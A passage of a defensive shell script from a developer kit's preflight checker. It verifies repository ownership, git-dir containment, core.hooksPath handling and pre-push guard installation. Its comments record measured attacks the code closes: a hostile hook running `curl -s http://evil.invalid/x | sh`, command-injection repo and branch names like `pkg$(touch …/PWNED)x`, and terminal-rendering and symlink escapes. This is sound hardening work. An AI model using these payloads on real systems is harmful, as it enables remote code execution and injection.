# agrees and why the kit once wrote a pre-push hook into a stranger's repository.
#
# BOTH sides of the compare must be PHYSICAL paths: `--show-toplevel` is symlink-resolved, `$PWD`
# is not. On macOS /tmp -> /private/tmp, so a logical compare FALSE-REFUSES under /tmp while
# passing on Linux CI. Normalizing both sides is the only compare that cannot drift.
#
# CP-11 closes the git-dir-CONTAINMENT gap: GIT_DIR/GIT_WORK_TREE env redirects are hard-refused, and
# submodule / `git worktree add` trees are refused unless gated behind --allow-nested. Residual (named,
# not absorbed): core.hooksPath, GIT_OBJECT_DIRECTORY, insteadOf — the git dir stays inside the cwd, so
# containment passes; out of CP-11 scope. See CP-11 design §6.
owning_repo_root() {  # <dir> -> stdout: physical toplevel, or empty when <dir> is in no repo
  ( CDPATH='' cd "$1" 2>/dev/null || exit 0
    _t=$(git rev-parse --show-toplevel 2>/dev/null) || exit 0
    CDPATH='' cd "$_t" 2>/dev/null && pwd -P )
}
owns_itself() {  # <dir> -> 0 iff <dir> is its own repo root, or is in no repo at all
  # "Cannot determine" must REFUSE, never proceed (the kit's default). Compute the physical cwd FIRST:
  # a dir we cannot even cd into is not "in no repo -> fine", it is unknown -> refuse. Unreachable from
  # today's call sites (all pass "$PWD"/"$ROOT"), but the wrong default is worth closing.
  _phys=$( CDPATH='' cd "$1" 2>/dev/null && pwd -P ) || return 1
  [ -n "$_phys" ] || return 1
  _own=$(owning_repo_root "$1")
  [ -n "$_own" ] || return 0
  # Ask git whether <dir> is the root, never compare path strings: on a case-insensitive filesystem `cd` into a
  # case-variant spelling keeps that spelling in `pwd -P` while git reports the toplevel as stored, so a string
  # compare refused the repository's own root. `--show-prefix` prints an empty line exactly at the root.
  # git also prints an empty prefix when the cwd is OUTSIDE the work tree (a `core.worktree` pointing elsewhere), so the same subshell requires
  # `--is-inside-work-tree` to print exactly `true`; anything else refuses.
  _pfx=$( CDPATH='' cd "$1" 2>/dev/null && [ "$(git rev-parse --is-inside-work-tree 2>/dev/null)" = true ] && git rev-parse --show-prefix 2>/dev/null ) || return 1   # MUT-OWNSINSIDE
  [ -z "$_pfx" ]   # MUT-OWNSROOT
}

# --- CP-11: git-dir redirection is a hard precondition (closes CP-4 §6) --------------------
# CP-4 proves toplevel==pwd, but `--show-toplevel` reports the cwd even when GIT_DIR/GIT_WORK_TREE, a
# submodule, or a `git worktree add` tree redirect the git dir ELSEWHERE (measured). The hook then lands
# in a repo the operator does not own (env) or a shared/other .git (structural). Invariant: the git dir
# that will receive the write lives INSIDE the tree I own. BOTH sides physical (the /tmp symlink landmine).
git_env_redirected() { [ -n "${GIT_DIR:-}" ] || [ -n "${GIT_WORK_TREE:-}" ]; }
git_dir_outside() {  # <dir> -> 0 (true) iff the physical git-common-dir is NOT inside <dir>
  _cwd=$( CDPATH='' cd "$1" 2>/dev/null && pwd -P ) || return 0
  _gcd=$( CDPATH='' cd "$1" 2>/dev/null && git rev-parse --git-common-dir 2>/dev/null ) || return 1
  [ -n "$_gcd" ] || return 1
  _gcd_phys=$( CDPATH='' cd "$1" 2>/dev/null && CDPATH='' cd "$_gcd" 2>/dev/null && pwd -P ) || return 0
  case "$_gcd_phys/" in "$_cwd"/*) return 1 ;; *) return 0 ;; esac
}

# --- K11: the pre-push runtime guard must actually be in force -----------------------------
# git clones neither .git/hooks/ nor .git/config, so an incepted repo's guard is ABSENT in every
# fresh clone. That is by design (hooks/pre-push:4 — "A SPEED BUMP, not a boundary"); the defect is
# that the absence is SILENT. Detection semantics are conformance/inception-done.sh's pre-push hook
# FLOOR leg (the KIT_GUARD_CORE marker test + _id_head_matches' compare-first precedence), verbatim.
GUARD_REFUSE=0; GUARD_STATE=""; GUARD_HOOK=""

guard_tree_class() {  # -> stdout: exactly one of incepted|kit-source|bare ; always exit 0
  # OWNER-AUTHORED (design §9). This predicate decides refuse-vs-silence, and both errors are costly:
  #   too broad  -> preflight cries wolf on the kit's own tree and is ignored (doctor.sh:18)
  #   too narrow -> fails open in exactly the fresh clone K11 exists for
  #
  # Measured signals available (verified 2026-07-21, kit 3.169.0):
  #   .kit-manifest        present in export/adopter lineage; ABSENT in the kit source tree
  #   git rev-parse --is-inside-work-tree   is there a .git at all to hold a hook
  #   docs/architecture/ADR-000-stack.md    inception produced its charter (also present in kit source)
  #   hooks/pre-push       the SOURCE hook; rides along in both trees, so NOT discriminating alone
  #   ENGINEERING-PRINCIPLES.md   incept.sh:540 renames the kit's principles CLAUDE.md to this, so it is
  #                        present in EVERY incepted tree and absent from the kit source (re-measured
  #                        2026-07-21; not in the plan's menu — the k11_fx fixture supplies it)
  #   CLAUDE.md            PRESENT IN BOTH CLASSES, so a PRESENCE test on it is useless — worse, it is
  #                        fail-open. incept.sh:540 renames the principles CLAUDE.md away and
  #                        incept.sh:561 immediately RE-CREATES CLAUDE.md from
  #                        templates/PROJECT-CLAUDE-TEMPLATE.md; that is exactly why
  #                        inception-done.sh:41-42 requires BOTH files of a done inception. It
  #                        discriminates only by CONTENT: the kit source's CLAUDE.md carries the literal
  #                        "Engineering Principles & Definition of Done" (the marker incept.sh:305 keys
  #                        on to decide a tree is an un-incepted kit); a project's CLAUDE.md carries
  #                        "**Project:**" and never that marker (measured: the phrase does not occur in
  #                        templates/PROJECT-CLAUDE-TEMPLATE.md).
  #
  # Contract enforced by legs P1/N1/N2/W1/W2/W3/U1/H1/H2/X1/F1 (incepted) and A1 (kit-source must be
  # SILENT); the fixture SHAPES those legs rest on are themselves locked by S1/S2.
  # ANCHOR THE FILE TESTS AT THE REPO TOP-LEVEL (`git rev-parse --show-toplevel`), not at the cwd: leg
  # W3 runs the check from a subdirectory, and a cwd-relative predicate answers kit-source there, which
  # silences the whole check from every subdirectory (measured while building W3).
  # No repo at all -> `bare`. There is no .git to hold a hook, so there is no obligation to report on
  # and nothing to say. `--show-toplevel` fails outright outside a work tree; treat an empty answer the
  # same way rather than falling through with an empty $_top and testing paths rooted at "/".
  _top=$(git rev-parse --show-toplevel 2>/dev/null) || { echo bare; return 0; }
  [ -n "$_top" ] || { echo bare; return 0; }

  # ENGINEERING-PRINCIPLES.md is INCEPTION'S OWN ARTIFACT: incept.sh:540 renames the kit's principles
  # doc to this name, and inception-done.sh:41 hard-requires it in a done inception. It is the narrowest
  # single fact meaning "inception ran in this tree", which is exactly when a missing guard is a defect.
  #
  # DELIBERATELY NOT conjoined with .kit-manifest or CLAUDE.md, though both are available and the
  # conjunction would also pass the fixtures. Every added condition is one more way to answer
  # kit-source -- i.e. one more door to SILENCE -- and silence in an incepted tree is precisely the
  # failure K11 exists to close. An incepted repo that has lost .kit-manifest is still an incepted repo
  # whose missing guard should be reported. Bias the ambiguity toward speaking up, never toward quiet.
  [ -f "$_top/ENGINEERING-PRINCIPLES.md" ] && { echo incepted; return 0; }

  # Everything else -- the un-incepted kit source tree, and any unrelated repo preflight happens to be
  # run in -- classifies kit-source and stays SILENT. Reporting a "missing" guard to someone who never
  # asked for one is the cry-wolf failure doctor.sh:18 warns about, and it is not our repo to police.
  echo kit-source
}

guard_is_kit_hook() {  # <path> -> 0 (true) iff that file CARRIES the kit's marker. NOT a verification.
  # THE SINGLE DEFINITION of "carries the kit's marker" (design §4.3): the KIT_GUARD_CORE token, and
  # nothing else — not the filename, not the mode bits, not which tree it sits in.
  #
  # WHAT THIS PREDICATE IS NOT — corrected in the final fix-loop (finding X1), because the previous
  # wording of this comment ("IS the kit's guard") claimed more than the code delivers, and
  # OVERCLAIMING A CONTROL IS ITSELF THE DEFECT. `grep -q KIT_GUARD_CORE` is a SUBSTRING test. The
  # substring is public, it appears in this very file, and anyone writing a hostile hook can put it in
  # a COMMENT. MEASURED (2026-07-21): a `hooks/pre-push` whose body was
  # `# KIT_GUARD_CORE` + `curl -s http://evil.invalid/x | sh` satisfied this predicate and received the
  # full vouched `cp … && chmod +x …`. The T2 fix-loop's own fixture passed only because it OMITTED the
  # token — i.e. the leg tested an attacker who did not try.
  #
  # So the contract is asymmetric, deliberately, and both callers are written to it:
  #   FALSE  is dispositive — no marker means it is definitely not ours; a cheap FIRST FILTER that may
  #          REJECT.
  #   TRUE   is NOT dispositive — it means "not rejected by the cheap filter", nothing more. No caller
  #          may treat it as a vouch. The refusal block prints a digest and the path, tells the HUMAN
  #          how to inspect the file with their own tools, and asks THEM to verify, because nothing
  #          available to a shell script can do it here. (This sentence used to say "prints a digest and
  #          an excerpt". It did, and the excerpt was the security re-review's BLOCK — see Rule 4 where
  #          guard_excerpt used to be. Corrected here rather than left as one more stale claim about a
  #          mechanism that no longer exists, which is this file's own recurring failure.)
  # Locked by legs MP7/MP8 (the filter still rejects) and MP10 (a TRUE does not produce a vouch).
  #
  # Extracted into a predicate because it has TWO callers and they must never drift apart:
  #   1. check_guard_installed, on the DESTINATION (.git/hooks/pre-push) — is the installed hook ours?
  #   2. the main-body refusal, on the SOURCE (<toplevel>/hooks/pre-push) — is the file we are about to
  #      show a human worth showing at all, or is it plainly not the kit's?
  # Caller 2 was added in the T2 fix-loop (finding J2). Before it, the source half was exempt from the
  # definition and the refusal printed a paste-able install command for whatever happened to sit at that
  # path — measured: a hooks/pre-push containing `curl -s http://evil.invalid/ | sh` produced the full
  # `cp … && chmod +x …` instruction with no caveat. Locked by legs MP7/MP8.
  #
  # UNREADABLE / ABSENT => FALSE, and that asymmetry is deliberate on each side. `grep -q … 2>/dev/null`
  # cannot tell "no marker" from "cannot read", so this predicate answers "not even carrying the token".
  # For caller 2 that is exactly the safe direction: a source that cannot be read is one we must not
  # show or offer. For caller 1 it would NOT be safe on its own — an unreadable KIT hook answering
  # "foreign" is fail-open behind a reassuring message — which is why that caller keeps its own explicit
  # `-r` test BEFORE this one and refuses `unreadable` as its own state. Moving this predicate ahead of
  # that test would re-open the hole leg U1 closes.
  grep -q 'KIT_GUARD_CORE' "$1" 2>/dev/null
}

# --- K11 fix-loop: the three rules every printed path obeys ---------------------------------
# All three exist because the T2 refusal applied a rule it had already stated correctly to ONE of its
# instances. Each is a PREDICATE/HELPER with a single definition, for the reason guard_is_kit_hook is:
# two copies of a security rule drift, and the copy that drifts is the hole.

guard_shq() {  # <string> -> that string, POSIX-quoted so it is INERT on a command line
  # RULE 1. Double quotes do NOT neutralise `$(…)` or backticks, so every `cp "<path>"` this script
  # printed was a command-injection primitive the moment a repo path carried one. MEASURED
  # (2026-07-21): a repo root named `pkg$(touch …/PWNED)x` produced a fix line whose paste CREATED
  # `PWNED`. That is not exotic input — `git check-ref-format --branch 'x$(id)y'` ACCEPTS the name
  # (measured), so any CI workspace derived from a branch or PR name is attacker-shaped.
  # Single quotes are the only shell quoting with no interior expansion at all; the sed turns each
  # embedded `'` into `'\''` (close, escaped quote, reopen). Round-tripped (2026-07-21) against
  # `$(…)`, backticks, `$HOME`, an apostrophe and `'';id;''` in sh, dash and bash.
  # THE `printf X` SENTINEL IS LOAD-BEARING: `$( )` strips trailing newlines, so without it a path
  # ending in one would be quoted into a DIFFERENT path. guard_path_hostile already rejects such a
  # path upstream — but a helper that is only correct because of a caller's precondition is the exact
  # defect class this fix-loop exists to close, so it is correct on its own.
  _shq=$( printf '%s' "$1" | sed "s/'/'\\\\''/g"; printf X )
  printf "'%s'" "${_shq%X}"
}

guard_path_hostile() {  # <string> -> 0 (true) iff it carries a control character
  # RULE 2. `printf '%s\n'` defeats BACKSLASH escapes; it does nothing at all about a LITERAL
  # newline, which passes straight through and forges a whole extra output line. MEASURED
  # (2026-07-21): a repo root whose name contained a real newline made the refusal branch whose
  # entire purpose is to REFUSE an install command print two complete `cp … && chmod +x …` blocks,
  # commenting out the real trailing path with an injected `#`. A `printf`-only fix cannot see that.
  # Rejection at parse time is the answer, and it is the kit's established one — CP-7 Slice 2 used
  # exactly this `case` against `--intent-owner` injection.
  # SCOPE: control characters only. A path may legitimately contain spaces, quotes, `$` and UTF-8;
  # those are handled by guard_shq (command lines) and by printf (labelled facts). Only a control
  # character can create a LINE, and a line is what forges a verdict.
  case "$1" in *[[:cntrl:]]*) return 0 ;; *) return 1 ;; esac
}

guard_resolve() {  # <path> -> its physical form, resolving the PARENT only; rc 1 when unresolvable
  # RULE 3. `cd -- "$p" && pwd -P` requires `$p` ITSELF to exist, which silently converts "this path
  # does not exist yet" into "this path is unresolvable" — and every caller reads unresolvable as
  # "some other tool owns this, stay quiet". MEASURED (2026-07-21): a repo whose `.git/hooks` does not
  # exist (created with an empty `--template`) plus the no-op `core.hooksPath=.git/hooks` took the
  # disclosed skip on a genuinely unguarded incepted tree — a fail-OPEN inside the fail-safe, and a
  # direct contradiction of design §8 ("is NOT skipped — it is judged normally").
  # Resolving the PARENT and appending the basename is existence-independent for the last component,
  # which is the only component that can be legitimately absent here.
  _gr_d=$(dirname -- "$1") || return 1
  _gr_b=$(basename -- "$1") || return 1
  _gr_p=$( CDPATH='' cd -- "$_gr_d" 2>/dev/null && pwd -P ) || return 1
  [ -n "$_gr_p" ] || return 1
  case "$_gr_b" in
    .|/) printf '%s\n' "$_gr_p" ;;
    ..)  ( CDPATH='' cd -- "$_gr_p/.." 2>/dev/null && pwd -P ) || return 1 ;;
    *)   printf '%s\n' "${_gr_p%/}/$_gr_b" ;;
  esac
}

guard_resolve_deep() {  # <path> -> physical form; only the deepest EXISTING ancestor need exist
  # RULE 3, SECOND FORM — and the two forms are NOT interchangeable, which is why both exist.
  # guard_resolve is existence-independent for the LAST component only. That is exactly right for the
  # core.hooksPath comparison, where an unresolvable value must stay unresolvable: leg H3 depends on
  # `<worktree>/.git/hooks` FAILING to resolve (in a linked worktree `.git` is a FILE) so the
  # main-worktree retry fires. A resolver that walked past that file would answer `<wt>/.git/hooks`,
  # the comparison would differ from the main tree's default hooks dir, and the check would SKIP from a
  # linked worktree — the fail-open H3 was written to close. Measured while building this helper.
  # But for a path being printed into a paste-able COMMAND the requirement is the opposite: make it
  # absolute whatever is missing. MEASURED (2026-07-21): with `.git/hooks` absent — the very repo shape
  # the Y1 fix made reachable — `$GUARD_HOOK` stayed RELATIVE and the refusal emitted
  # `mkdir -p '.git/hooks' && cp … '.git/hooks/pre-push'`, a command that silently targets the wrong
  # tree when pasted from anywhere else. That is the §4.5 broken-paste defect W3 and MP5 exist for,
  # surfacing in a repo shape no fixture had reached before. So: walk up to the deepest ancestor that
  # does resolve, then re-append what was peeled off.
  # `.`/`..` are NEVER peeled — they always resolve when reachable, so failing on one means a
  # permission problem, and re-appending `..` to an already-physical path would invent a path. rc 1
  # there, and the caller leaves the value alone rather than printing something it made up.
  _grd_p="$1"; _grd_tail=""
  while :; do
    _grd_abs=$( CDPATH='' cd -- "$_grd_p" 2>/dev/null && pwd -P ) && break
    _grd_b=$(basename -- "$_grd_p") || return 1
    _grd_d=$(dirname -- "$_grd_p") || return 1
    [ "$_grd_d" != "$_grd_p" ] || return 1
    case "$_grd_b" in .|..) return 1 ;; esac
    _grd_tail="/$_grd_b$_grd_tail"
    _grd_p="$_grd_d"
  done
  # THE ROOT IS THE ONE ANCESTOR `%/` DESTROYS (security re-review, finding MED-1). `pwd -P` returns a
  # trailing slash for exactly one directory — `/` — and the `%/` that exists to stop `//` appearing in
  # the joined path strips the ONLY character there. With an empty tail the helper then printed the
  # EMPTY STRING WITH RC 0: a success return carrying no value, which every caller reads as
  # "unresolvable, stay quiet" via its own `[ -n … ] || return 1`. MEASURED identically in sh, dash and
  # bash (2026-07-21) — and MEASURED end to end: with `.git/hooks -> /`, guard_hooks_dir_escapes skipped
  # containment through that rc-0 arm and the refusal emitted `mkdir -p '/' && cp … '/pre-push' &&
  # chmod +x '/pre-push'`. A fail-open reached through a SUCCESS path is invisible to every caller that
  # only checks rc, which is why the answer is here and not in a caller. `/` is the correct answer, not
  # rc 1: the root IS resolvable, the callers must be able to test it for containment, and returning
  # rc 1 would put the same fail-open back one layer down. Locked by leg D3.
  [ -n "$_grd_abs" ] || return 1
  _grd_out="${_grd_abs%/}$_grd_tail"
  [ -n "$_grd_out" ] || _grd_out="/"
  printf '%s\n' "$_grd_out"
}

guard_hooks_dir_escapes() {  # <hook path> -> 0 (true) iff its DIRECTORY resolves OUTSIDE the git dir
  # M-1. The `dangling` branch tests `[ -h "$GUARD_HOOK" ]` — the LEAF. A `.git/hooks` that is ITSELF a
  # symlink walks straight past that test, and MEASURED (2026-07-21) the refusal then emitted
  # `mkdir -p '<outside>' && cp … '<outside>/pre-push' && chmod +x '<outside>/pre-push'`: an executable
  # written OUTSIDE the repository, which is exactly the outcome `dangling` exists to prevent, one path
  # component up. Same precondition as `dangling` (local write access to `.git/`), so this is hardening
  # rather than a live attack — but offering the command is the wrong ANSWER regardless.
  #
  # PHYSICAL CONTAINMENT, AND ONLY THAT. The task brief offered two triggers — "`--git-path hooks` is a
  # symlink, OR the physical hooks dir is not inside the git dir" — and the first was built, MEASURED,
  # and then REMOVED. Both halves of that are worth recording:
  #   * IT HAD NO INDEPENDENT KILL. Mutation-tested (2026-07-21): deleting the `[ -h ]` trigger and
  #     keeping containment leaves leg D2 RED for the same two assertions. Every escape it caught,
  #     containment caught. Shipping a defence with no fixture that dies without it is shipping a claim.
  #     THAT MEASUREMENT WAS NARROWER THAN THE SENTENCE IT JUSTIFIED, and the security re-review's
  #     finding MED-1 is the proof: the fixture set it ran against contained no `.git/hooks -> /`, the
  #     ONE shape where containment did NOT catch what `[ -h ]` would have (guard_resolve_deep returned
  #     the empty string with rc 0 for the root, so containment was skipped entirely). "Every escape it
  #     caught, containment caught" was true of the fixtures and false of the claim — which is the
  #     failure mode this file names one screen down at the `hooks-dir-symlink` fixture: a fixture set
  #     that does not carry the attack's essential property tests something else and reports it as the
  #     thing you asked for. THE TRIGGER IS STILL NOT REINSTATED, deliberately: it would restore the
  #     cry-wolf below, and it would patch one SHAPE of a defect the resolver had for every caller
  #     (`_g_lnk` and `_g_hdir` in the refusal block use the same helper). The resolver is the general
  #     defect and is where the fix went; leg D3 is the fixture the earlier mutation run lacked.
  #   * IT CRIED WOLF. The one shape it caught alone is a hooks dir symlinked to somewhere INSIDE the
  #     worktree (`.git/hooks -> <top>/shared-hooks`) — a real pattern for teams who want hooks under
  #     version control. That writes nothing outside the repository, so it is not the harm this predicate
  #     names; and refusing it withholds the install command from a legitimate setup with no way to get
  #     it back, which is the cry-wolf failure doctor.sh:18 warns about. A prescription in a brief is a
  #     hypothesis, not a patch.
  # Containment is also the more general form: a `.git` that is itself a symlink, a hooks dir reached
  # through a symlinked ancestor, or a `--git-dir` pointing elsewhere all produce the same escape with no
  # link on the leaf. It answers the question the refusal actually needs answered — "would the command I
  # am about to print write outside this repository?" — and is blind to how the escape was constructed.
  #
  # CONTAINMENT IS AGAINST TWO ROOTS, NOT ONE — the git common dir AND the worktree top-level. The task
  # brief specified the common dir alone; that is WRONG, and measured so (2026-07-21, git 2.48.1) rather
  # than argued: from a LINKED WORKTREE with the no-op `core.hooksPath=.git/hooks`, `--git-path hooks`
  # answers `<wt>/.git/hooks` while `--git-common-dir` answers `<main>/.git`, so the one-root test calls
  # an ordinary linked worktree an escape. It turned leg H3 RED — the leg that exists because that exact
  # config must be JUDGED from a worktree rather than silently skipped. A repository is its git dir AND
  # its worktree; a path inside either is not "outside the repository", and the harm this predicate
  # exists to prevent is stated in those words.
  #
  # BOTH SIDES RESOLVE EXISTENCE-INDEPENDENTLY (guard_resolve_deep, Rule 3's second form): the hooks dir
  # legitimately may not exist (an empty `--template` — the Y1/MP12 repo shape) and in the H3 lane
  # neither does its parent, and a resolver that failed there would answer "escapes" on an ordinary repo
  # and suppress a correct install command. UNRESOLVABLE => NOT an escape: this predicate only ever
  # WITHHOLDS a command, so failing it closed would cry wolf while failing it open leaves today's
  # behaviour untouched. The escape it is written for resolves fine.
  # THAT LAST SENTENCE IS ONLY AS TRUE AS THE RESOLVER, and finding MED-1 is what it cost when it was
  # not: guard_resolve_deep answered the ROOT with the empty string and rc 0, so `.git/hooks -> /` —
  # an escape that resolves perfectly well — took this fail-open arm anyway. The `[ -n … ] || return 1`
  # below cannot distinguish "no such path" from "the resolver lost the value", so this arm is a
  # fail-open whose safety is entirely a property of guard_resolve_deep. Fixed there, locked by D3, and
  # recorded here because the next person to add a resolver caller inherits the same dependency.
  # NOT CALLED WHEN core.hooksPath REDIRECTS — that stanza returns first, so a husky/lefthook adopter
  # whose hooks dir is deliberately elsewhere never reaches this and is never judged by it.
  _ghe_hd=$(dirname -- "$1") || return 1
  _ghe_hd=$(guard_resolve_deep "$_ghe_hd") || return 1
  [ -n "$_ghe_hd" ] || return 1
  for _ghe_root in "$(git rev-parse --git-common-dir 2>/dev/null)" "$(git rev-parse --show-toplevel 2>/dev/null)"; do
    [ -n "$_ghe_root" ] || continue
    _ghe_r=$(guard_resolve_deep "$_ghe_root") || _ghe_r=""
    [ -n "$_ghe_r" ] || continue
    # The trailing slash on both sides makes this a PATH-COMPONENT prefix test, not a string one:
    # without it `<top>/.gitmodules-hooks` would count as inside `<top>/.git`. The pattern side is a
    # quoted expansion, so a glob metacharacter in the repo path is literal (the W3 measurement).
    case "$_ghe_hd/" in "${_ghe_r%/}"/*) return 1 ;; esac
  done
  return 0
}

guard_sha256() {  # <path> -> its sha256, or empty when no hasher is available
  # X1: the HUMAN is the verifier, so the human needs something to verify AGAINST. Degrades to empty
  # rather than failing — a missing hasher must not turn a refusal into an error, and the caller says
  # so in as many words instead of printing a blank where a digest belongs.
  if command -v shasum >/dev/null 2>&1; then
    shasum -a 256 -- "$1" 2>/dev/null | cut -d' ' -f1
  elif command -v sha256sum >/dev/null 2>&1; then
    sha256sum -- "$1" 2>/dev/null | cut -d' ' -f1
  fi
}

# THERE IS DELIBERATELY NO `guard_excerpt` HERE — RULE 4, and the reason it exists.
#
# NEVER RENDER UNTRUSTED CONTENT INSIDE A SECURITY VERDICT. REFERENCE IT.
#
# The T3 refusal printed the candidate hook's first 6 lines, "rendered inert" by a `    | ` prefix, a
# `tr -d` control-character range and a width bound. The security re-review BLOCKED on it (finding H-1)
# and the owner ratified DELETING the feature rather than widening the filter. Both halves of that are
# load-bearing, so both are recorded:
#
#   * NO BYTE FILTER CLOSES THE CLASS. The shipped range omitted CR (\015) — MEASURED (2026-07-21): a
#     hostile `hooks/pre-push` whose lines were `x<CR><a real kit-guard line>` rendered the `    | `
#     prefix AWAY (CR returns the cursor to column 0) and the preview was INDISTINGUISHABLE from the
#     genuine guard, while the payload sat on line 7, one line below the window. Terminal selection
#     copies RENDERED cells, so the human pastes the attacker's line. Adding CR and NUL to the range
#     would not have fixed it: bidi/RLO (U+202E) reorders the rendering and a `tr` under LC_ALL=C cannot
#     see it at all. The attack is a RENDERING substitution and every defence available here operates on
#     BYTES — which is also why the leg guarding it (MP10) was GREEN while the attack worked.
#   * EVEN UNATTACKED IT HAD NEGATIVE VALUE (finding L-1). A 6-line preview presented as the human's
#     evidence, with a payload on line 7 invisible, MANUFACTURES ASSURANCE IT CANNOT DELIVER: it makes a
#     reader who glanced at it feel they checked, which is worse than a reader who knows they have not.
#
# What replaces it is a REFERENCE, not a rendering: the absolute path, the sha256, the affordances that
# can actually discriminate (`less`, `git log -p`) and — because the digest and the human's paste are
# separated by a TOCTOU window no shell script can close — an explicit instruction to re-check. Locked
# by leg MP10, whose claim is now "no line of the file appears in the output", which is decidable,
# rather than "the rendered content is inert", which is not.

guard_hookspath_is_noop() {  # <core.hooksPath value> -> 0 (true) iff it names the repo's DEFAULT hooks dir
  # A core.hooksPath of `.git/hooks` (some tooling writes exactly that) redirects NOTHING, so treating
  # "the key is set" as "the key redirects" would go silent on exactly the unguarded state K11 catches.
  # Compare PHYSICAL dirs instead.
  #
  # COMPARED AGAINST `--git-common-dir`/hooks — the repo's DEFAULT hooks dir — and deliberately NOT
  # against dirname("$GUARD_HOOK"). CORRECTED PREMISE (measured 2026-07-21, git 2.48.1; the earlier
  # comment here asserted the opposite and was WRONG): `git rev-parse --git-path hooks/pre-push` DOES
  # honour core.hooksPath — with hooksPath=.husky it answers `.husky/pre-push`, and `--git-path hooks`
  # answers `.husky`, while `--git-path objects` still answers `.git/objects` (the special-casing is
  # hooks-specific). So dirname("$GUARD_HOOK") is the REDIRECTED dir and would compare equal to
  # core.hooksPath ALWAYS — the skip would never fire and every husky/lefthook adopter would be judged.
  # `--git-common-dir` is unaffected by the setting (measured: `.git` in all three states) and, from a
  # linked worktree, absolute and pointing at the MAIN .git — which is exactly the dir W1/W2 pin.
  # VERSION-ROBUST EITHER WAY: on a git where --git-path is hooksPath-aware, GUARD_HOOK points into the
  # foreign dir but we skip before judging it; on one where it is not, GUARD_HOOK points at the default
  # dir and we still skip. The redirect case never reaches a verdict, and the no-op case yields
  # `.git/hooks/pre-push` under both behaviours.
  #
  # RESOLUTION RULE for a RELATIVE value (measured): it resolves against the WORKTREE TOP-LEVEL, not the
  # cwd — git chdir's to the top-level before running a hook, so `.myhooks` found <top>/.myhooks even
  # when the git command was issued from <top>/a/b. Resolving against the cwd would be wrong from any
  # subdirectory.
  #
  # TWO ROOTS, NOT ONE — the linked-worktree lane (G1; measured 2026-07-21, git 2.48.1, by installing a
  # marker hook and watching whether it FIRED, not by reading rev-parse):
  #   no core.hooksPath        -> <main>/.git/hooks/<hook> RUNS from the main tree AND from a linked worktree
  #   hooksPath=.git/hooks     -> RUNS from the main tree (and from any subdir of it); from a LINKED
  #                               WORKTREE it does NOT run AT ALL — the relative value resolves against
  #                               the worktree top-level, where `.git` is a FILE, so the configured dir
  #                               <wt>/.git/hooks does not exist and git executes nothing
  #   hooksPath=<abs>/.git/hooks -> RUNS from both
  # So from a linked worktree that value is not a no-op and not a redirect: it is a DANGLING pointer that
  # disables hooks. Both readings share the only thing the skip cares about — no OTHER TOOL owns a hooks
  # dir here, so the deference the skip exists to grant has no beneficiary, and the tree must be judged.
  # Hence the SECOND resolution attempt below, rooted at the MAIN worktree (the common dir's parent):
  # without it the same .git/config produced OPPOSITE verdicts from the two trees — MISS+armed from the
  # main tree, a disclosed skip from the worktree. That was a fail-OPEN nested inside the fail-safe.
  # Locked by leg H3.
  # UNRESOLVABLE AGAINST EITHER ROOT => NOT a no-op, i.e. the caller SKIPS. That is the status-quo
  # behaviour and the direction that can never cry wolf on a repo whose hooks another tool owns.
  # BOTH SIDES RESOLVE EXISTENCE-INDEPENDENTLY (guard_resolve — Rule 3 above), and doing only one side
  # would be worse than doing neither. MEASURED (2026-07-21, the Y1 finding): the old form required the
  # DEFAULT hooks dir to exist; in a repo created with an empty `--template` it does not, `_hp_def` came
  # back empty, the function answered "not a no-op", and the caller took the DISCLOSED SKIP on a
  # genuinely unguarded incepted tree — fail-open, and the exact opposite of what design §8 says happens
  # to a value naming the repo's own default hooks dir. Locked by leg H4.
  #
  # WHICH HALVES ARE INDEPENDENTLY LOAD-BEARING — MEASURED BY MUTATION (2026-07-21), because the review
  # brief asserted this and got the detail wrong, and an unmeasured "both sides are needed" is the same
  # class of claim this fix-loop keeps finding:
  #   revert `_hp_def` alone                     -> H4 dies      (the def side IS independently needed)
  #   revert the VALUE side's attempt 1 alone    -> H4 SURVIVES  (attempt 2, the main-worktree retry,
  #                                                 also uses guard_resolve and rescues it from the
  #                                                 main tree — the only tree H4 runs in)
  #   revert BOTH value attempts                 -> H4 dies      (the value side as a whole IS needed)
  # So attempt 1's guard_resolve is defence-in-depth with no independent kill on today's fixtures, and
  # that is stated rather than implied: it is kept for one-helper consistency (Rule 3) and because a
  # future fixture reaching attempt 1 without attempt 2 would otherwise silently regress.
  _hp_cd=$(git rev-parse --git-common-dir 2>/dev/null) || _hp_cd=""
  [ -n "$_hp_cd" ] || return 1
  _hp_def=$(guard_resolve "$_hp_cd/hooks") || _hp_def=""
  case "$1" in
    /*) _hp_abs=$(guard_resolve "$1") || _hp_abs="" ;;
    *)  _hp_top=$(git rev-parse --show-toplevel 2>/dev/null) || _hp_top=""
        _hp_abs=""
        [ -z "$_hp_top" ] || _hp_abs=$(guard_resolve "$_hp_top/$1") || _hp_abs=""
        if [ -z "$_hp_abs" ]; then
          # Attempt 2 — the MAIN worktree root, reached through the .git-file indirection that
          # --git-common-dir already followed for us. NARROWED TO THE UNRESOLVABLE CASE ON PURPOSE: when
          # attempt 1 resolves, git's own answer stands and this never runs, so a real redirect that
          # exists in the worktree (a checked-out `.husky/`) still skips exactly as before. Still
          # reachable after the guard_resolve change: in a LINKED WORKTREE `<wt>/.git` is a FILE, so the
          # PARENT of `<wt>/.git/hooks` cannot be cd'd into either and attempt 1 still fails (leg H3).
          _hp_main=$(guard_resolve "$_hp_cd/..") || _hp_main=""
          [ -z "$_hp_main" ] || _hp_abs=$(guard_resolve "$_hp_main/$1") || _hp_abs=""
        fi ;;
  esac
  [ -n "$_hp_abs" ] && [ -n "$_hp_def" ] && [ "$_hp_abs" = "$_hp_def" ]
}

guard_hookspath_is_tracked_dir() {  # <core.hooksPath value> -> 0 (true) iff it names THIS worktree's own tracked hooks/
  # HOOK-INSTALL-RECURS-PER-SLICE, review round 1 (reviewer, MEASURED): preflight is the THIRD
  # enforcement surface, and it did not move with the ruling. `docs/adoption/brownfield.md` §2 step 5
  # now RECOMMENDS pointing core.hooksPath at the repo's own tracked `hooks/` — after which
  # `guard-wired.sh` certifies that file in full and `inception-done.sh` accepts it as the live hook,
  # while this script still printed "skip pre-push guard — … this repo manages its own hooks. The kit
  # is NOT judging hooks/pre-push. Install the guard there yourself." Three surfaces, two answers: the
  # adopter who takes the documented advice is told by one tool that the guard is live and by another
  # that the kit is not looking. That is the same class of contradiction Δ6 fixed at the Inception
  # gate, one surface over.
  # THE VALUE IS NOT FOREIGN WHEN IT NAMES THE REPO'S OWN TRACKED HOOKS DIR, so the deference the skip
  # exists to grant has no beneficiary: no other tool owns `hooks/` — the kit's own hook is committed
